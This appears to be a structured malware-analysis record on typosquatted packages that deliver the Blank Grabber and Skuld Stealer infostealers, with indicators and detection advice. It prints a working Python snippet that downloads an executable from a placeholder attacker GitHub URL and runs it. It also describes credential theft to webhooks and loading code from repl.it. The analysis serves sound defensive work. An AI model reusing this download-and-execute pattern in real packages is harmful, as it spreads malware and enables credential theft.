package_info.package_versions: all published versions of the malicious typosquatted packages
package_info.why_malicious: The packages are part of a coordinated supply chain attack campaign using typosquatting to impersonate legitimate libraries. They deliver infostealer malware (Blank Grabber, Skuld Stealer) to exfiltrate sensitive data from infected systems, primarily targeting Windows users. The packages reference legitimate tools to appear trustworthy and use external platforms (GitHub, repl.it) to host and deliver malicious payloads.

malicious_snippets.code_snippet:
import requests
url = 'https://raw.githubusercontent.com/attacker/repo/main/payload.exe'
response = requests.get(url)
with open('payload.exe', 'wb') as f:
    f.write(response.content)
os.system('payload.exe')
malicious_snippets.code_behavior: At import-time, the code downloads an executable payload from a remote GitHub repository and executes it, resulting in the installation of infostealer malware.

malice_analysis.why_suspicious: Downloading and executing remote binaries during import-time is highly unusual and dangerous, as it allows arbitrary code execution without user consent.
malice_analysis.violated_expectations: Legitimate packages should not fetch and execute remote code automatically upon import; they should only provide library functionality.
malice_analysis.similar_legitimate_use: Automated updaters or installers may download binaries, but only with explicit user action and clear documentation.

malicious_snippets.code_behavior: At runtime, the code reads sensitive files (such as browser login data) and environment variables (like DISCORD_TOKEN), then exfiltrates this data via HTTPS POST to a remote webhook endpoint.

malice_analysis.why_suspicious: Accessing credential stores and exfiltrating their contents to an external server is a hallmark of infostealer malware.
malice_analysis.violated_expectations: Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent.
malice_analysis.similar_legitimate_use: Security auditing tools may access such files, but only with user awareness and for legitimate security purposes.
key_indicators: Access to credential stores (browser data, tokens)
Exfiltration to webhook.site or similar endpoints
Use of environment variables for sensitive data

malicious_snippets.code_behavior: At import-time, the code downloads a secondary Python script from repl.it and immediately imports it, enabling execution of arbitrary attacker-controlled code.

malice_analysis.why_suspicious: Fetching and executing code from an external source at import-time is a clear sign of malicious intent, as it allows the attacker to update the payload at any time.
malice_analysis.violated_expectations: setup.py should only define package installation logic, not execute remote code.
malice_analysis.similar_legitimate_use: None; this is never legitimate in package installation scripts.
key_indicators: Download and import of remote code
Use of code hosting platforms (repl.it) for payload delivery

attack_chain.action: User installs or imports the malicious typosquatted package.
Malicious payload (infostealer) is executed on the victim's system.
Infostealer accesses sensitive files and environment variables, exfiltrating data to attacker-controlled endpoints.
attack_chain.leads_to: Attacker receives stolen credentials and sensitive information

behavioral_signatures: Package downloads and executes remote code at import-time or installation
Access to credential stores (browser data, environment tokens) by package code
Exfiltration of data to external endpoints (webhook.site, GitHub, repl.it)
file_indicators: setup.py or __init__.py containing remote code download logic
Unexpected executable files (payload.exe, malware.py) created during package use
References to external code hosting platforms (GitHub, repl.it) in package source
network_indicators: Outbound HTTP/HTTPS requests to GitHub raw URLs
Connections to webhook.site or similar data collection endpoints
Downloads from repl.it or other code hosting services
detection_knowledge.how_to_detect: Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import.
